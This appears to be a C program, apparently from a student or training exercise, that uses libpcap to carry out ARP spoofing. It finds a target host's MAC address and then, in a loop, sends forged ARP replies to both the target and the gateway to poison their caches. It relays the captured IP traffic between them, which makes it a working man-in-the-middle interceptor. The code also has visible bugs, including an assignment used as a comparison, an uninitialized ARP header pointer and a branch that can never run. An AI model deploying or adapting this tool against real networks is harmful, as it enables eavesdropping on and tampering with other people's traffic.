#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include "networkinfo.h"
#include "arp.h"

int gett_mac(const u_char *packet, u_char *t_mac, u_char* t_ip);
int packetrelay(pcap_t *pcd, char *dev, u_char *packet, u_char *g_ip, u_char *s_mac, u_char *t_ip, u_char *t_mac, u_char *g_mac);
int main(void){
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr hdr;
    const u_char *packet;
    u_char sp_buf[MTUSIZE], s_ip[IPSIZE], t_ip[IPSIZE], s_mac[MACASIZE], t_mac[MACASIZE], g_ip[IPSIZE], g_mac[MACASIZE];
    pcap_t *pcd;  // packet capture descriptor

    dev = pcap_lookupdev(errbuf); // 디바이스 이름
    if (dev == NULL)    {
        printf("%s\n", errbuf);
        exit(1);
    }

    pcd = pcap_open_live(dev, BUFSIZ,  1, 1000, errbuf);
    if (pcd == NULL){
        printf("%s\n", errbuf);
        exit(1);
    }

    printf("Target IP Address: ");
    scanf("%s", t_ip);

    if((sendarpreq(pcd, dev, sp_buf, t_ip)) == -1){
        pcap_perror(pcd,0);
        pcap_close(pcd);
        exit(1);
    }
    while(1){
        packet = pcap_next(pcd, &hdr);
        if(gett_mac(packet, t_mac, t_ip) == 1)
            break;
    }

    getGIPAddress(dev, g_ip);
    getGMACAddress(g_ip, g_mac);
    getMIPAddress(dev, s_ip);
    getMMACAddress(dev, s_mac);

    int pid = fork();
    if(pid == 0){
        while(1){
            printf("send arp reply packet\n");
            if((sendarprep(pcd ,dev, sp_buf, g_ip, s_mac, t_ip, t_mac)) ==-1) {
                pcap_perror(pcd,0);
                pcap_close(pcd);
                exit(1);
            };
            if((sendarprep(pcd, dev, sp_buf, t_ip, s_mac, g_ip, g_mac)) ==-1) {
                pcap_perror(pcd,0);
                pcap_close(pcd);
                exit(1);
            };
            sleep(1);
        }
    }
    else{
        while(1){
            packet = pcap_next(pcd, &hdr);
            packetrelay(pcd, dev, packet, g_ip, t_ip, s_mac, t_mac, g_mac);
        }
    }
    return 0;
}
int gett_mac(const u_char *packet, u_char * t_mac, u_char* t_ip){
    struct ether_header *etheh; // Ethernet 헤더 구조체
    unsigned short ether_type;

    // 이더넷 헤더를 가져온다.
    etheh = (struct ether_header *)packet;
    packet += sizeof(struct ether_header);
    // 네트워크 패킷은 big redian 이라서 little redian형식으로 바꿔준다.
    ether_type = ntohs(etheh->ether_type);

    if (ether_type == ETHERTYPE_ARP){
        struct ether_arp *arph; // arp 헤더 구조체
        arph = (struct ether_arp *)packet;
        packet += sizeof(struct ether_arp);
        if(arph->ea_hdr.ar_op = ARP_OPER_REP){
            char tip[IPSIZE];
            inet_ntop(AF_INET, &arph->arp_spa, tip, sizeof(tip));
            if(!strcmp(tip, t_ip)){
                memcpy(t_mac, arph->arp_sha, MACASIZE);
                return 1;
            }
        }
    }
    return 0;
}

int packetrelay(pcap_t *pcd, char *dev, u_char *packet, u_char *g_ip, u_char *t_ip, u_char *s_mac, u_char *t_mac, u_char *g_mac){
    struct ether_header *etheh;
    struct ip *iph;
    u_char tip[IPSIZE], sip[IPSIZE];
    u_char *cp = packet;
    etheh = (struct ether_header *)cp;
    if(etheh == NULL)
        return 0;
    cp += sizeof(struct ether_header);
    if(etheh->ether_type == ntohs(ETHERTYPE_IP)){
        iph = (struct ip*)cp;

        inet_ntop(AF_INET, &iph->ip_dst, tip, sizeof(tip));
        inet_ntop(AF_INET, &iph->ip_src, sip, sizeof(sip));
        if(!strcmp(sip, t_ip)){
            memcpy(etheh->ether_dhost, g_mac, MACASIZE);
            memcpy(etheh->ether_shost, s_mac, MACASIZE);
            pcap_inject(pcd, packet, sizeof(struct ether_header) + ntohs(iph->ip_len));
        }
        else if(!strcmp(tip, t_ip) && !memcmp(etheh->ether_shost, g_mac, MACASIZE)){
            memcpy(etheh->ether_shost, s_mac, MACASIZE);
            memcpy(etheh->ether_dhost, t_mac, MACASIZE);
            pcap_inject(pcd, packet, sizeof(struct ether_header) + ntohs(iph->ip_len));
        }
        else if (etheh->ether_type == ntohs(ETHERTYPE_ARP)){
            struct ether_arp *arph;
            cp = (struct ether_arp*)cp;
            inet_ntop(AF_INET, &arph->arp_tpa, tip, sizeof(tip));
            inet_ntop(AF_INET, &arph->arp_spa, sip, sizeof(sip));
            if((!strcmp(sip, t_ip) && !strcmp(tip, g_ip)) || (!strcmp(sip, g_ip) && !strcmp(tip, t_ip))){
                if((sendarprep(pcd ,dev, packet, g_ip, s_mac, t_ip, t_mac)) ==-1) {
                    pcap_perror(pcd,0);
                    pcap_close(pcd);
                    exit(1);
                };
                if((sendarprep(pcd, dev, packet, t_ip, s_mac, g_ip, g_mac)) ==-1) {
                    pcap_perror(pcd,0);
                    pcap_close(pcd);
                    exit(1);
                };
            }
        }
    }

}
